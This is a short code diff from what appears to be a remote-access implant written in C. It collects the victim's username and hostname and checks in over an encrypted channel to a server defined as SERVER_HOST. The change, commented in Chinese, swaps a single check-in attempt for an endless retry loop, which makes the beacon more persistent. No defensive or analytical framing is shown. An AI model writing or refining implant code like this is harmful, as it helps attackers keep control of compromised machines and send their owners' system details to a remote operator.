@@ -292,14 +292,18 @@ int main(int argc, char *argv[]) {
   protocol_get_sysinfo(&info);
   DEBUG_PRINT("[+] System info: %s@%s\n", info.username, info.hostname);
 
-  DEBUG_PRINT("[*] Attempting checkin to %s:%d...\n", SERVER_HOST, SERVER_PORT);
-  int checkin_result = protocol_checkin(&g_crypto, &info);
-  if (checkin_result != 0) {
+  // Checkin loop: 持续重试直到成功
+  while (1) {
+    DEBUG_PRINT("[*] Attempting checkin to %s:%d...\n", SERVER_HOST,
+                SERVER_PORT);
+    int checkin_result = protocol_checkin(&g_crypto, &info);
+    if (checkin_result == 0) {
+      DEBUG_PRINT("[+] Checkin successful!\n");
+      break;
+    }
     DEBUG_PRINT("[!] Checkin failed (code: %d), retrying in %d seconds...\n",
                 checkin_result, RECONNECT_DELAY);
     Sleep(RECONNECT_DELAY * 1000);
-  } else {
-    DEBUG_PRINT("[+] Checkin successful!\n");
   }
 
   protocol_free_sysinfo(&info);
